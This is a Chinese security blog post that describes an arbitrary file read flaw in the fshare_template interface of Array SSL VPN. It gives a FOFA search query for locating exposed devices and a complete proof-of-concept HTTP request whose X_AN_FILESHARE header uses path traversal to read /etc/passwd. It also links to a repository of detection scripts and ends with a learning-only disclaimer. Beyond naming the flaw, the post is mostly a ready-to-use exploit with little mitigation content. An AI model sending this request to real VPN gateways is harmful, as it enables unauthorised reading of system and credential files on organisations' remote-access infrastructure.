#  Array VPN任意文件读取漏洞   
原创 安全透视镜  网络安全透视镜   2023-11-24 07:00  
  
# 一、漏洞描述  
  
****  
Array SSL VPN远程安全接入软件具备远程安全接入网关的全部功能，可以在虚拟化或云环境中提供专业的远程安全访问；它帮助用户实现在任何时间任何地点使用任何设备都可以安全地连接到云上的主机或应用。  
  
Array的 fshare_template 接口存在任意文件读取漏洞  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6TyxiaReKfTY4L4xqz8nwwCd6amcU1rpDuHpQIaCnPia5eT00mBiaLaHLHUxlFPUCZAZZE4Il29yshg/640?wx_fmt=png&from=appmsg "")  
  
# 二、网络空间搜索引擎  
  
  
fofa查询  
```
product="Array-VPN"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6TyxiaReKfTY4L4xqz8nwwCW9mspJkQnqASialmQKb2g3yfBYhyWicqSEQvAib6u8mZ0ibLCbqpaX30qA/640?wx_fmt=png&from=appmsg "")  
  
# 三、漏洞复现  
  
  
POC  
```
GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6TyxiaReKfTY4L4xqz8nwwC4kJ1jpq64JHBveB5sgjYibTbcKcU7gbho6icFvP3kGXmk0mZDsErr3Iw/640?wx_fmt=png&from=appmsg "")  
  
# 四、漏洞检测  
  
  
pocsuite检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6TyxiaReKfTY4L4xqz8nwwCELBWib17cf00KkXswuK0NVx08n05DJav7h6ybDyWiaauIWNdA00Br7jA/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞检测脚本已上传免费漏洞库  
  
地址：  
  
https://github.com/Vme18000yuan/FreePOC  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6TyxiaReKfTY4L4xqz8nwwCddo7Rvcs7fhjMEk3gEf0icdpicmYaX0RgAhrLAEWGibj8ekvDnVVyLB6A/640?wx_fmt=png&from=appmsg "")  
  
  
# 免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS51gqsJwIM82Y5RTicXUygDUxQ76EiavrIibm8L0BUzdF6veUR4dQOKJn2iaEFQlNeq0PIPSFXTibx0OZw/640?wx_fmt=png&from=appmsg "")  
  
****  
  
